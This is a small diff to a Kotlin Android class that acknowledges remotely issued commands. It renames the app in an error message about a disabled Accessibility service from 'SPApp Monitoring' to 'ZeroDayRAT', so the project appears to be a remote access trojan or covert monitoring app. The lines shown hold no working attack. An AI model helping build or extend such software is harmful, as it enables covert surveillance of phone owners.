@@ -619,7 +619,7 @@ class SyncRunner(private val context: Context) {
                     command.id,
                     AckCommandRequest(
                         success = false,
-                        message = "Accessibility service is not active on this device. Please enable Accessibility for SPApp Monitoring in phone Settings."
+                        message = "Accessibility service is not active on this device. Please enable Accessibility for ZeroDayRAT in phone Settings."
                     )
                 )
             } catch (e: Exception) {
